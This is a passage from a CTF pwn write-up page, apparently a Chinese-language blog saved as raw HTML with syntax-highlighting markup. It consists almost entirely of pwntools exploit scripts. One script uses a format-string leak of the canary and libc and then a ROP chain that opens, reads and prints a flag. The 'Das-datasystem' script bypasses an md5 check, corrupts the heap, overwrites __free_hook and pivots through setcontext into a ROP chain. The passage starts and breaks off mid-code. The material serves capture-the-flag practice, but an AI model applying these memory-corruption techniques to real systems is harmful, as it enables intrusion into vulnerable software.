class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\n<span class=\"token comment\"># dbg('printf')</span>\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'name'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'%28$p,%27$p,%39$p,'</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">'0x'</span><span class=\"token punctuation\">)</span>\nstack <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">',0x'</span><span class=\"token punctuation\">)</span>\ncanary <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\nru<span class=\"token punctuation\">(</span><span class=\"token string\">',0x'</span><span class=\"token punctuation\">)</span>\n__libc_start_main <span class=\"token operator\">=</span> rint<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">240</span>\n\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'stack'</span><span class=\"token punctuation\">,</span>stack<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'canary'</span><span class=\"token punctuation\">,</span>canary<span class=\"token punctuation\">)</span>\nlg<span class=\"token punctuation\">(</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">,</span>__libc_start_main<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># 29 28 26</span>\n\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __libc_start_main <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__libc_start_main'</span><span class=\"token punctuation\">]</span>\n\nread_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\nopen_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\nputs_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n\nret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">' ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsyscall <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'syscall'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\nflag_addr <span class=\"token operator\">=</span> stack <span class=\"token operator\">+</span> <span class=\"token number\">0xb8</span>\norw <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span>\n\npayload <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x68</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>canary<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>  orw\n\n\nsla<span class=\"token punctuation\">(</span><span class=\"token string\">'you?'</span> <span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span>\n\n\n\n<span class=\"token comment\"># l64()</span>\n\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   hahapwn.py\n@Time    :   2021/09/25 18:06:52\n@Author  :   Niyah \n'''</span></code></pre>\n<h1 id=\"das-datasystem\"><a class=\"markdownIt-Anchor\" href=\"#das-datasystem\">#</a> Das-datasystem</h1>\n<p>需要在最开始时候绕一下 md5，静态看起来是真的 ex，不如动调一下，绕 md5 的思路是 strcmp 0 截断</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \ncontext<span class=\"token punctuation\">.</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./datasystem'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">'node4.buuoj.cn'</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">'27789'</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>progress<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span>\n        <span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Size: '</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'Content'</span> <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>idx <span class=\"token punctuation\">,</span>Content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Index'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'Content'</span> <span class=\"token punctuation\">,</span> Content<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n\npwd <span class=\"token operator\">=</span> <span class=\"token string\">'\\x1b\\xf3\\xee\\xf3\\xb2\\x13\\xf6\\x0e\\x9er\\xcb\\xc5\\x83\\x97/\\x0e\\xa7\\x93I\\xef7\\xed\\xc7j\\xa8Z\\xb3\\xdaX[\\xea\\x83'</span>\n\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">'username'</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'admin'</span><span class=\"token punctuation\">)</span>\nsa<span class=\"token punctuation\">(</span><span class=\"token string\">'password:'</span> <span class=\"token punctuation\">,</span> pwd<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># add( 0x20 , 'a'*0x20)</span>\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x150</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\n\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span> <span class=\"token punctuation\">,</span> flat<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x160</span><span class=\"token operator\">+</span><span class=\"token number\">0x431</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x420</span> <span class=\"token punctuation\">,</span><span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\nshow<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n\n__malloc_hook <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span>\nlibc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> __malloc_hook <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">]</span>\n__free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\nsetcontext <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'setcontext'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token number\">53</span>\n\nread_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\nopen_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\nputs_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\nret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">' ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\npop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\nadd<span class=\"token punctuation\">(</span><span class=\"token number\">0x150</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span>\ndelete<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\nedit<span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>__free_hook<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">)</span>\n\nflag_addr <span class=\"token operator\">=</span> __free_hook <span class=\"token operator\">+</span> <span class=\"token number\">0x148</span>\n\norw <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n    pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n<span class=\"token punctuation\">)</span>\n\npayload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>setcontext<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> orw <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token number\">3</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>__free_hook <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token 